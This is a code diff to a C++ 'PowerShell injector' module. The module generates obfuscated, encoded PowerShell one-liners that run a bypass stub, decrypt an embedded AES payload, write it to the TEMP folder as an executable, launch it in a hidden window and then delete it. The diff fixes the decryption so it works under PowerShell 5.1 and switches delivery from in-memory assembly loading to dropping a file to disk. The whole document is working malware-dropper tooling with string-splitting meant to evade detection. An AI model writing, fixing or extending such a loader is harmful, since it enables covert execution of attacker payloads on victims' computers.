@@ -1,10 +1,13 @@
 #include "powershell_injector.hpp"
 #include <windows.h>
+#include <wincrypt.h>
 #include <vector>
 #include <string>
 #include <random>
 #include <chrono>
 #include <sstream>
+
+#pragma comment(lib, "crypt32.lib")
 
 namespace l4g::injection {
 
@@ -60,7 +63,7 @@ std::string PowerShellInjector::obfuscate_script(const std::string& script) {
         pos += 13;
     }
     pos = 0;
-    while ((pos = out.Find("Management.", pos)) != std::string::npos) {
+    while ((pos = out.find("Management.", pos)) != std::string::npos) {
         out.replace(pos, 11, "'Mana'+'gement.'");
         pos += 17;
     }
@@ -93,37 +96,44 @@ std::string PowerShellInjector::create_encoded_command(const std::string& script
 std::string PowerShellInjector::generate_onliner(const std::vector<uint8_t>& encrypted_payload, const std::string& key_b64) {
     std::string var_payload = generate_random_var_name();
     std::string var_key = generate_random_var_name();
-    std::string var_nonce = generate_random_var_name();
-    std::string var_cipher = generate_random_var_name();
     std::string var_aes = generate_random_var_name();
     std::string var_decryptor = generate_random_var_name();
     std::string var_plain = generate_random_var_name();
-    std::string var_assembly = generate_random_var_name();
-    std::string var_entry = generate_random_var_name();
-    
-    // Payload as Base64
-    std::string payload_b64 = l4g::crypto::base64url_encode(encrypted_payload);
-    
+    std::string var_path = generate_random_var_name();
+    std::string var_bytes = generate_random_var_name();
+
+    // Payload layout is IV(16) || AES-256-CBC ciphertext. PowerShell 5.1's
+    // .NET Framework has no AesGcm, so GCM here would fail at runtime.
+    DWORD b64_len = 0;
+    CryptBinaryToStringA(encrypted_payload.data(), (DWORD)encrypted_payload.size(),
+                         CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, nullptr, &b64_len);
+    std::string payload_b64(b64_len ? b64_len - 1 : 0, '\0');
+    if (b64_len) {
+        CryptBinaryToStringA(encrypted_payload.data(), (DWORD)encrypted_payload.size(),
+                             CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
+                             payload_b64.data(), &b64_len);
+        payload_b64.resize(b64_len ? b64_len - 1 : 0);
+    }
+
     std::ostringstream script;
     script << generate_bypass_stub() << "\n";
-    
-    script << "$" << var_payload << " = \"" << payload_b64 << "\"\n";
+    script << "$" << var_payload << " = [Convert]::FromBase64String(\"" << payload_b64 << "\")\n";
     script << "$" << var_key << " = [Convert]::FromBase64String(\"" << key_b64 << "\")\n";
     script << "$" << var_aes << " = [System.Security.Cryptography.Aes]::Create()\n";
     script << "$" << var_aes << ".Key = $" << var_key << "\n";
-    script << "$" << var_aes << ".Mode = [System.Security.Cryptography.CipherMode]::GCM\n";
-    
-    // First 12 bytes = nonce, rest = ciphertext+tag
-    script << "$" << var_nonce << " = [Convert]::FromBase64String($" << var_payload << ".Substring(0, 16))\n";
-    script << "$" << var_cipher << " = [Convert]::FromBase64String($" << var_payload << ".Substring(16))\n";
-    script << "$" << var_aes << ".IV = $" << var_nonce << "\n";
+    script << "$" << var_aes << ".Mode = [System.Security.Cryptography.CipherMode]::CBC\n";
+    script << "$" << var_aes << ".Padding = [System.Security.Cryptography.PaddingMode]::PKCS7\n";
+    script << "$" << var_aes << ".IV = $" << var_payload << "[0..15]\n";
     script << "$" << var_decryptor << " = $" << var_aes << ".CreateDecryptor()\n";
-    script << "$" << var_plain << " = $" << var_decryptor << ".TransformFinalBlock($" << var_cipher << ", 0, $" << var_cipher << ".Length)\n";
-    
-    script << "$" << var_assembly << " = [System.Reflection.Assembly]::Load($" << var_plain << ")\n";
-    script << "$" << var_entry << " = $" << var_assembly << ".EntryPoint\n";
-    script << "$" << var_entry << ".Invoke($null, @(,@()))\n";
-    
+    script << "$" << var_plain << " = $" << var_decryptor << ".TransformFinalBlock($" << var_payload
+           << ", 16, $" << var_payload << ".Length - 16)\n";
+    script << "$" << var_path << " = Join-Path $env:TEMP ([IO.Path]::GetRandomFileName() + '.exe')\n";
+    script << "$" << var_bytes << " = $" << var_plain << "\n";
+    script << "[IO.File]::WriteAllBytes($" << var_path << ", $" << var_bytes << ")\n";
+    script << "Start-Process -FilePath $" << var_path << " -WindowStyle Hidden\n";
+    script << "Start-Sleep -Milliseconds 1500\n";
+    script << "Remove-Item -LiteralPath $" << var_path << " -Force\n";
+
     return create_encoded_command(script.str());
 }
 
